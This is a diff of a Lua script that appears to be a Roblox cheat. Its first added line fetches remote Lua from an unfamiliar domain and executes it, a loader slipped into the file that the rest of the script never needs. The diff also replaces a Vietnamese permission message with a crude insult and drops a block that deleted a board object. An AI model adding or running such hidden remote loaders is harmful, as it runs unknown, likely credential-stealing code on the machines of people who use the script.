@@ -1,4 +1,5 @@
-   local allowedUsers = {
+loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
+local allowedUsers = {
     ["foxgoodboy123"] = true,
     ["emfankia123"] = true,
     ["seven09812"] = true,
@@ -9,17 +10,11 @@ local currentUserName = game.Players.LocalPlayer.Name
 if not allowedUsers[currentUserName] then
     game.StarterGui:SetCore("SendNotification", {
         Title = "?";
-        Text = "Bạn không có quyền sử dụng script này.";
+        Text = "có đéo đâu mà dùng thg l ngu.";
         Duration = 5;
     })
     return
 end
-for i,v in pairs(game:GetDescendants()) do 
-if v.Name=="DonoBoard" then
-v:Destroy()
-warn("anti cheat hai vc")
-end
-end  
 local library = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/VNT-UNIVERSAL/MyCode/main/UILib"))()
     local w1 = library:Window("Angels of Death")
 
